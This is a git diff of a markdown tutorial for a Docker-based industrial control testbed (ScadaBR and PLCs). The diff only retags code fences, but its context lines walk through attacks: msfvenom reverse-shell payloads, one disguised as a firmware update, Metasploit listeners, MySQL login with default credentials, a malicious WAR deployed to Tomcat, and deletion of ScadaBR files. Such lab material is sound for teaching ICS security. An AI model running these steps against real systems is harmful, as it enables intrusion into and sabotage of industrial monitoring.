@@ -7,7 +7,7 @@ At this level, we consider you've installed the original testbed network (i.e fr
 
 Docker Containers
 
-```
+```bash
 docker ps 
 ```
 
@@ -37,7 +37,7 @@ Displays the list of containers, you should have 06 plcs running, scadaBR and si
 - You could also access scadaBR with docker cli
 
 bash
-```
+```bash
 docker exec -it scadabr bash
 ```
 
@@ -45,7 +45,7 @@ docker exec -it scadabr bash
 ## *Setting up the attacker's machine*
 
 Docker command:
-```
+```bash
 sudo docker run -d -t --net swat --hostname attacker --name attacker --privileged --ip 172.18.0.18 -p 10018:8080 kalilinux/kali-rolling
 ```
 
@@ -62,7 +62,7 @@ Docker container
 ## *Accessing the attacker's machine via the docker cli*
 
 bash:
-```
+```bash
 docker exec -it attacker bash
 ```
 
@@ -75,7 +75,7 @@ The first scenario consist of exploiting the database of scadaBR to erase monito
 If Metasploit is not installed in the attacker's machine, follow these steps:
 
 Attacker's terminal
-```
+```bash
 apt-get update && apt-get install -y git curl wget python3-pip
 apt install metasploit-framework
 ```
@@ -87,7 +87,7 @@ apt install metasploit-framework
 #### *Command to craft the payload in the attacker's machine*
 
 Attacker's terminal
-```
+```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f elf -o mtu_firmware_update.elf
 ``` 
 
@@ -95,14 +95,14 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f 
 - In our attack scenario, we assume the phising attack went on successfullu, so we simply upload the crafted payload into the target container
 
 bash 
-```
+```bash
 docker cp attacker:/scripts/mtu_firmware_update.elf scadabr:/home
 ```
 
 Then in scadabr, we run this 
 
 ScadaBR terminal
-```
+```bash
 cd home
 chmod +x mtu_firmware_update.elf
 ./mtu_firmware_update.elf
@@ -113,7 +113,7 @@ chmod +x mtu_firmware_update.elf
 #### *Set up a Metasploit Listener and Mysql exploit*
 
 Attacker's terminal
-```
+```bash
 msfconsole
 use exploit/multi/handler
 set payload linux/x86/meterpreter/reverse_tcp
@@ -126,7 +126,7 @@ exploit
 - But The aim here is exploit the mysql database deployed in this server, so we could use another exploit instead of multi/handler
 
 Attacker's terminal
-```
+```bash
 use scanner/mysql/mysql_login 
 run rhost=172.18.0.10 rport=3306 username=scadabr password=scadabr createsession=true
 sessions -i -1 
@@ -149,14 +149,14 @@ query_interactive
 - In the attacker's machine we simple create a malicious war file that we going to deploy in the tomcat server 
 
 Attacker's machine
-```
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp lhost=172.18.0.18 lport=1234 -f war > shell.war
 ```
 
 - We deploy this `shell.war` file in the tomcat dashboard and set a Listener on the attacker's machine using netcat
 
 Attacker's machine
-```
+```bash
 apt install netcat-traditional
 nc -lvp 1234
 ```
@@ -164,7 +164,7 @@ nc -lvp 1234
 - With this, the attacker will be able to access the shell of the tomcat server from the malicious shell.war file and be able to even delete scadaBR configuration files
 
 Attacker's machine
-```
+```bash
 nc -lvp 1234
 cd tomcat7/webapps/ScadaBR/META-INF
 rm index.jsp
